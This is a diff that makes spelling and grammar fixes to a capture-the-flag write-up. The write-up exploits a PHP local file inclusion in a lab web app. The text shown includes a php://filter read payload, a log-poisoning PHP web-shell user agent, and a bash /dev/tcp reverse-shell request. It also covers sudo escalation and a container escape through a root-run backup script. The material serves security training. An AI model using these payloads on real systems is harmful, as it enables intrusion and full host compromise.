@@ -39,7 +39,7 @@ dogs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration:
 ```
 
 We assume that these folders contain the content of the web app (images of cats and dogs).
-But we don't have permissions to access them.
+But we don't have permission to access them.
 
 Let's try making use of the first flag's hint: *There's more to *view* than just cats and dogs...*.\
 Notice that view is the name of the query argument when calling the api for a random cat/dog image.
@@ -57,8 +57,8 @@ The command returns many entries. Note that `-fs 455` is used to exclude entries
 Navigating to `http://<machine_ip>/?view=catalog`, we get the following:
 ![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/70e44b57-bf4b-45cd-a15e-889d8d9d2e49)
 
-Allright, now we know that the value of `view` is attached to ".php" extension and then passed to the `include` function.\
-Since this is the case, we can use a php filter to disclose the source code of php files in the server. But first, lets see what php files do we have there:
+Alright, now we know that the value of `view` is attached to ".php" extension and then passed to the `include` function.\
+Since this is the case, we can use a php filter to disclose the source code of php files in the server. But first, let's see what php files do we have there:
 ```
 $ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt:FUZZ -u "http://<machine_ip>/FUZZ" -e .php
 
@@ -68,7 +68,7 @@ flag.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43m
 ```
 
 Interestingly, we found a flag file. Now we can use the read filter to get its content encoded in base64.\
-When testing the payload, I was getting the "Sorry, only dogs or cats are allowed" error, so I tried many assumptions on how the app is verifying this conditions.
+When testing the payload, I was getting the "Sorry, only dogs or cats are allowed" error, so I tried many assumptions on how the app verifies these conditions.
 One of them, which later succeeded, is that the app checks if the value of the path contains "cat" or "dog".\
 Hence, to get the flag, we pass the value `http://<machine_ip>/?view=php://filter/read=convert.base64-encode/resource=cats/../flag`. We used "cats" because this is an existing folder on the server, and from which we know the relative location of "flag.php".
 
@@ -94,18 +94,19 @@ Let's get the index file (same directory as flag.php) and see how the app actual
         ?>
 <...snip...>
 ```
-First, we now validate how the app decides when a value of *view* is valid. And second, the url argument *ext* is used to specify the extension of the file to include and thus, we can now include whatever file (according to permissions) on the server.
+First, we now validate how the app decides when a value of *view* is valid. Second, the URL argument *ext* is used to specify the extension of the file to include, and thus, we can now include whatever file (according to permissions) on the server.
 
-One common method to exploit LFI vulnerabilities is log poisonning. For this, we poison our user-agent to acheive RCE when we include the log file.\
+One common method to exploit LFI vulnerabilities is log poisoning. For this, we poison our user-agent to achieve RCE when we include the log file.\
 
-- Log file location : `/var/log/apache2/access.log`
-- User Agent : `<h1><?php system($_GET['cmd']); ?></h1>`
+- Log file location: `/var/log/apache2/access.log`
+- User Agent: `<h1><?php system($_GET['cmd']); ?></h1>`
 - Result when visiting `http://<machine_ip>/?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=id`
+
 ![Screenshot_2023-12-08_20_29_42](https://github.com/elomarii/CTF_4_DAY/assets/106914699/62233aba-1ee3-4977-9435-09672e19054a)
 
 
 Now that we can execute commands on the target machine, let's first get a reverse shell.\
-We can use Burpsuite to manipulate the http request, the crafted request I used is the following, where the bash command used is `bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'`. Don't forget to started a listener on your machine before sending the request.
+We can use Burpsuite to manipulate the HTTP request, the crafted request I used is the following, where the bash command used is `bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'`. Don't forget to start a listener on your machine before sending the request.
 ```http
 GET /?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/<rhost>/<rport>+<%261' HTTP/1.1
 Host: <machine_ip>
@@ -117,7 +118,7 @@ Connection: close
 Cache-Control: max-age=0
 ```
 
-We find the second flag on the parent folder of where the app lives (execute command `ls ..`).
+We find the second flag on the parent folder where the app lives (execute command `ls ..`).
 
 For our next flag, we can try and see if `www-data` (our user) can execute any commands as root with no password. And bang, yes we can:
 ```
@@ -141,7 +142,7 @@ To continue working as root we execute the following command
 www-data@e43f08c3313d:/var/www/html$ sudo env bash -i
 ```
 
-One of the ways to break out from the container is to inspect drives owned by the user (the one who run the container) on the host system.
+One of the ways to break out from the container is to inspect drives owned by the user (the one who runs the container) on the host system.
 ```
 root@e43f08c3313d:/var/www/html# df -h
 
@@ -156,7 +157,7 @@ tmpfs           240M     0  240M   0% /proc/scsi
 tmpfs           240M     0  240M   0% /sys/firmware
 ```
 
-`/opt/backup` is mounted on `/dev/xvda2` in the host filesystem and occupies most of the space of the container. Checking its content, we find a script that is run regularly by root on the host machine to backup the container. Because we have permissions to write to that file, we can send a reverse shell back to our machine:
+`/opt/backup` is mounted on `/dev/xvda2` in the host filesystem and occupies most of the space of the container. Checking its content, we find a script that is run regularly by root on the host machine to back up the container. Because we have permissions to write to that file, we can send a reverse shell back to our machine:
 
 ```
 root@e43f08c3313d:/var/www/html# ls -l /opt/backups
